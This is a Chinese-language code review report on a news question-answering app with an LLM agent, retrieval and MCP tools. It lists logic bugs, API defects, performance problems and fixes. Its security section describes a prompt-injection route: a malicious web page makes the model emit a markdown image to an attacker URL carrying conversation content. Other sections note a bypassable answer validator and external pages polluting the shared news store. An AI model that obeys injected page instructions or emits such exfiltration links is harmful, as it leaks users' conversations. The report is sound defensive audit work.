# 代码审查报告（2026-10-21）

审查范围：后端 `main.py` / `routers` / `crud` / `models` / `schemas` / `utils` / `config` / `cache` / `mcp_servers` / `harness` 全部代码，前端 `apps/frontend/src` 核心文件，`sql/`、`scripts/ai_tables.sql`；`scripts/`、`eval/`、`evals/` 抽读。

审查时代码版本：`09dd641 Update project description in README.md`。

## 0. 验证方式与结果

- 在隔离 venv 中按 `requirements.txt` 安装依赖后运行 `pytest`：**15 个测试文件在收集阶段 ImportError**，原因是 `requirements.txt` 缺少 `qdrant-client`。
- 补装 `qdrant-client` 后：**325 passed, 3 failed, 1 skipped**（README 写的是 328 passed）。3 个失败均在 `tests/test_rag_time_aware_ranking.py`，原因见 1.4。
- 仓库没有 CI workflow（`.github/` 下只有 `dependabot.yml`），上述问题无法被自动发现。
- 关键逻辑问题（1.1、1.2、1.3、1.5、2.1）均用脚本实际复现过。

## 1. 严重：功能静默失效 / 行为错误

### 1.1 LLM 工具规划实际上永远不会执行
- 位置：[harness/agent.py:445](../harness/agent.py#L445) `_plan_tool_calls`
- 现象：代码先调用确定性 fallback `build_fallback_tool_calls`，只有它返回空时才让模型规划。而 fallback 对除 `general_chat` 外的所有意图都会返回调用；`general_chat` 又没有可用工具。结果是"模型规划 tool_calls"这一分支永远走不到，`web_fetch`、`news_search`、`user_recent_history` 等工具从不会被调用。
- 文档和注释描述的"模型规划，不稳则 fallback"与实际顺序相反。

### 1.2 "新闻 123 讲了什么"这类问题不会调用任何工具
- 位置：[harness/intent.py:100-105](../harness/intent.py#L100)、[harness/agent.py:85](../harness/agent.py#L85)
- 原因：意图被判为 `news_qa`，fallback 生成 `news_detail` 调用；但 `news_qa` 的白名单只有 `retrieve_news`，于是调用被过滤，工具列表为空，最终回答"站内未找到"。
- 复现结果：`'新闻 123 讲了什么' -> news_qa ['news_detail'] kept= []`。

### 1.3 超过 200 字的提问会静默跳过检索
- 位置：[harness/tool_registry.py:45](../harness/tool_registry.py#L45) `RetrieveNewsArgs.query max_length=200`
- 原因：参数校验失败抛 `ToolPolicyError`，被 `_plan_tool_calls` 吞掉，不报错也不降级。
- 复现结果：200 字 → 有调用；201 字 → `validated calls: []`。
- 追问更容易触发：[context_manager.py](../harness/context_manager.py#L882) `build_contextual_retrieval_query` 会在问题前拼接最多 6 个线索词（锚点标题、主题等）。

### 1.4 "最近 xx"类问题随时间推移必然无结果
- 位置：[harness/rag_search.py:175-234](../harness/rag_search.py#L175)
- 原因：问题含"最近/最新/今天"等词时，要求 `recency_score >= 0.80`（即 90 天内发布）。`_filter_stale_recent_items` 全部过滤掉后**没有兜底**（对比 `_filter_severe_low_quality` 有 `min_remaining` 保护）。语料是静态的，过了 90 天，所有"最近"问题都会拿不到证据。
- v2 检索（[rag_search_v2.py:735](../harness/rag_search_v2.py#L735)）复用了同一函数，同样受影响。
- 当前 3 个失败测试正是这个原因：测试数据写死 2026-05/06，而代码用 `time.time()`，且 `search_news_rag` 无法注入 `now_ts`。

### 1.5 意图识别用子串匹配，误判明显
- 位置：[harness/intent.py:17](../harness/intent.py#L17)
- 关键词 `"ai"` 会命中 email、detail、said、main 等英文词。复现：`'什么是email' -> news_qa`。

### 1.6 用户发一个 URL，就会把外部网页写进公共新闻表
- 链路：消息含 URL → fallback 调用 `web_capture_ocr` → [external_evidence.py:495](../harness/external_evidence.py#L495) `index_ocr_capture_record` → [rag_index.py:44-63](../harness/rag_index.py#L44) `add_external_doc`
- 后果：未经核验的站外内容被插入 MySQL `news` 表（`category_id=1` 写死）并写入 Qdrant 父级 collection，**所有用户的新闻列表都能看到**，之后还会以 `news:ID` 形式被当作"站内证据"引用。与项目自己"站外内容默认低可信"的原则相矛盾。
- `agent.py:1441-1454` 对 `web_fetch` 结果也有同样的回灌逻辑（目前因 1.1 不会触发，但属于潜在问题）。

### 1.7 回答校验可被轻易绕过
- 位置：[harness/answer_validator.py:175-179](../harness/answer_validator.py#L175)、[harness/agent.py:1547-1548](../harness/agent.py#L1547)
- 原因：只要回答里出现"换个关键词""站内未找到"等字样就被认定为拒答，跳过引用检查；`agent.py` 最后还会把这类回答强制改为 `passed=True`。而系统提示词本身就要求模型在证据不足时说这句话，所以"部分编造 + 一句拒答话术"的回答会直接通过。

### 1.8 默认配置下校验只是"影子模式"，但影子模式又会改答案
- 默认 `RAG_SEARCH_VERSION=v1`、`RAG_ECON_COLLECTION_ENABLED=false`，路由永远是 `default`，所以 `resolve_validation_mode` 永远返回 `shadow`，enforce 改写流程从不生效。
- 但 [agent.py:1508](../harness/agent.py#L1508) 的 `_should_force_no_answer` 在 shadow 模式下也会把答案替换成拒答，与"shadow 只观测不干预"的语义不符。

### 1.9 "流式输出"是假的
- 位置：[harness/agent.py:1492](../harness/agent.py#L1492)、[agent.py:1558](../harness/agent.py#L1558)
- answer contract 默认开启时，先非流式 `client.complete()` 生成完整答案，再经过校验，最后用 `_chunk_text` 切块推送。用户要等完整生成才能看到第一个字，最长可达 `LLM_TIMEOUT_SECONDS=90` 秒。

## 2. 业务接口 Bug

| 位置 | 问题 |
|---|---|
| [models/users.py:33-34,58](../models/users.py#L33) | `default=datetime.now()` 带括号，在模块导入时求值一次，所有用户/令牌的 `created_at`、`updated_at` 都是服务启动时间（已验证） |
| [routers/history.py:49-56](../routers/history.py#L49) + [crud/history.py:47](../crud/history.py#L47) | 路由参数叫 `history_id`，crud 却按 `news_id` 删除；前端恰好传的是新闻 ID（`History.vue` 中 `confirmDelete(item.id)`），两个错误互相抵消才能用。按接口语义传 historyId 的客户端会删错记录或 404 |
| [utils/exception.py:46](../utils/exception.py#L46) | 所有 `Duplicate entry` 都提示"用户名已存在"，重复收藏、手机号重复也是这句 |
| [routers/users.py:73-74](../routers/users.py#L73) | 旧密码错误返回 500，应为 400 |
| [routers/news.py:34](../routers/news.py#L34) | `page` 没有 `ge=1`，page=0 产生负 offset，数据库报错返回 500 |
| [crud/news_cache.py:31-54](../crud/news_cache.py#L31) | 缓存未命中时列表返回 ORM 对象（含整篇 `content`），命中时用 `NewsItemBase` 序列化（无 `content`），同一接口首次和后续返回结构不同；列表字段是 snake_case（`category_id`），详情是 camelCase（`categoryId`） |
| [routers/news.py:58-62](../routers/news.py#L58) | 先读缓存再 +1 浏览量，详情里的 `views` 最长滞后 1 小时；分类缓存忽略 `skip/limit` 参数；列表查询没有 `order_by`，分页顺序不确定 |
| [crud/users.py:37-47](../crud/users.py#L37) | 每个用户只有一个 token，A 设备登录会把 B 设备踢下线；修改密码不吊销旧 token；token 明文存库 |
| [schemas/users.py](../schemas/users.py#L6) | 用户名/密码无长度和非空校验；`UserUpdateRequest` 用 `str = None` 无校验，`gender` 不校验 DB 枚举；全空更新请求会生成空 `UPDATE` 导致 500；可更新 `phone`，但响应里不返回 |
| [routers/favorite.py:31](../routers/favorite.py#L31) | 添加收藏不检查新闻是否存在，依赖外键报错 |
| [routers/ai.py:108-109](../routers/ai.py#L108) | SSE 错误事件直接把 `str(e)` 返回前端，泄露内部异常信息；出错时用户消息已落库，助手消息不落库 |
| [models/favorite.py:31](../models/favorite.py#L31) | 收藏时间用 `utcnow`，其他表用本地时间，前端显示差 8 小时 |
| [utils/auth.py](../utils/auth.py#L10) | 缺少 Authorization 头时返回 422 而不是 401 |

## 3. 安全

1. **外部网页可诱导"图片外传"**：web/OCR 内容被放进 `role: system` 消息（[agent.py:955-964](../harness/agent.py#L955)），前端 [AIChat.vue:126](../apps/frontend/src/views/AIChat.vue#L126) 的 DOMPurify 默认保留 `<img>`。恶意网页可注入指令让模型输出 `![](https://attacker/?q=对话内容)`，浏览器会自动请求，造成数据外传。建议外部内容放 user/tool 角色，并在前端禁用外链图片。
2. **AI 接口无限流、无消息长度限制**：`/api/ai/chat` 每次调用都会起子进程并请求 LLM，容易被刷。
3. **前端 token 存在 localStorage**，XSS 时可被窃取；[store/user.js:239-247](../apps/frontend/src/store/user.js#L239) 的 `persist: { enabled, strategies }` 是旧插件语法，在 pinia-plugin-persistedstate v4 中被忽略（只是碰巧仍会持久化）。
4. 做得好的部分：`safe_http_client`（先解析 DNS 再直连 IP、逐跳校验重定向、限制大小）以及工具参数 `extra="forbid"` + 后端注入 `user_id`，设计合理。小问题：`is_safe_ip` 建议改用 `not ip.is_global` 覆盖 100.64.0.0/10 等地址；未处理 chunked 编码；未知 charset 会抛 `LookupError`。

## 4. 性能与架构

1. **每条聊天消息都启动新的 Python 子进程**：[harness/mcp_client.py:19-34](../harness/mcp_client.py#L19) 等三个 client 每次请求通过 stdio 拉起一个 MCP server（要重新 import qdrant/sqlalchemy/openai），web 类问题还会拉起两个。延迟高，而且让 [rag_search_v2.py:57](../harness/rag_search_v2.py#L57) 的 embedding 缓存完全失效。
2. **每次工具调用都销毁连接池**：[business_server.py:70](../mcp_servers/business_server.py#L70) 等处 `await async_engine.dispose()`。
3. **最近对话重复发给 LLM**：[context_manager.py:975-977](../harness/context_manager.py#L975) 在 system 消息里嵌入了 recent_messages，[agent.py:968](../harness/agent.py#L968) 又把同样的 history 追加一遍。另外每条助手消息都把完整 ledger（每类最多 80 条，JSON indent=2）存进 `ai_message.evidence`，数据库和 token 都会持续膨胀。
4. **检索层的精心排序被下游覆盖**：v1/v2 做了 hybrid/时间感知/light rerank，但 [agent.py:1400](../harness/agent.py#L1400) 用 cross-encoder `rerank()` 重新打分覆盖 `rerank_score`。`sentence_transformers` 不在 requirements 里，加载失败时静默降级为召回顺序，且每次请求都会重试加载。carryover boost 固定 +0.08，与 v2 分数（0~30 量级）尺度不匹配。`fusion_rerank` 线上未使用。注释提到的 `scripts.warmup_reranker` 不存在。[reranker.py:20](../harness/reranker.py#L20) 在导入时全局设置 `HF_HUB_OFFLINE=1`。
5. **网页截图 OCR 是绕圈**：[web_capture.py:84-110](../harness/web_capture.py#L84) 已经通过 `safe_fetch` 拿到网页文本，却把文本渲染成图片再 OCR 回文本，只会损失信息，还额外依赖 playwright + paddleocr。
6. `LLMClient`/`AsyncOpenAI`、Qdrant client 每次请求新建且不关闭（`rag_search` 中的 qdrant）。
7. [routers/ai.py:83](../routers/ai.py#L83) 用原始消息判意图存库，而 [agent.py:1362](../harness/agent.py#L1362) 用拼接上下文后的 `retrieval_user` 判意图，两处记录不一致；拼接的线索词（如"xx 报道"）可能把闲聊翻转成新闻问答。

## 5. 可运行性与工程化

1. **`requirements.txt` 不完整**：缺 `qdrant-client`（硬依赖）；`sentence-transformers`（缺失时静默降级）；`asyncpg` 为 `>=` 无上限；`playwright`、`paddleocr`、`rapidfuzz`、`psycopg` 为可选依赖但没有任何说明。
2. **无法从零搭建数据库**：仓库没有 `user` / `news` / `news_category` / `favorite` / `history` / `user_token` 任何建表语句，也没有 `create_all` 或迁移工具；[scripts/ai_tables.sql](../scripts/ai_tables.sql) 外键引用了不存在的 `user` 表（且用 `INT UNSIGNED`，需与 user.id 类型一致）。README 的快速开始照做跑不起来，且用的是 Windows 的 `copy` 命令。
3. **三套存储并存**：MySQL（业务）+ Qdrant（向量）+ PG（v2 元数据，仅脚本使用），迁移只完成一半；`config/rag_meta.json` 是建索引时写入的运行时状态，却提交在仓库里。
4. **测试只覆盖 Agent 链路**：用户、新闻、收藏、历史的路由和 crud 没有任何测试；测试依赖系统时间（见 1.4）；没有 CI。
5. **代码规模与正确性失衡**：`scripts/` 约 1 万行，大部分是 gold label 晋升流程（plan/simulate/preflight/apply/rollback/confirmation packet）；`eval/` 与 `evals/` 两套评测目录；v1/v2 检索并存；死代码：`harness/tool_context.py`、`TOOL_DEFINITIONS`、`fusion_rerank`、`search_news_v2`、`HelloWorld.vue`、`test_main.http` 中不存在的 `/hello/User`。脚本里有写死的 Windows 路径（`D:/Files/BaiDu`）；`report_capital_market_candidate_profile.py` 用裸模块名导入，`python -m` 方式运行会失败。

## 6. 建议修复顺序

1. 补全 `requirements.txt`（至少加 `qdrant-client`），加一个跑 `pytest` 的 CI。
2. 修工具规划：让 LLM 规划优先或修正 fallback 与白名单的一致性（1.1、1.2）；超长 query 截断而不是丢弃（1.3）；意图关键词改为词边界匹配（1.5）。
3. 时间过滤加兜底，`search_news_rag` 支持注入当前时间，修复 3 个测试（1.4）。
4. 停止把站外内容写入公共 `news` 表，改为独立的低可信 staging 表或 collection（1.6）。
5. 修复 `datetime.now()` 默认值、历史删除参数、异常提示文案、分页校验等业务 Bug（第 2 节）。
6. 补核心表 DDL（或 Alembic 迁移）和业务接口测试（第 5 节）。
7. 再处理性能与架构问题：MCP server 常驻、去掉 `dispose()`、去重上下文、统一排序打分（第 4 节）。
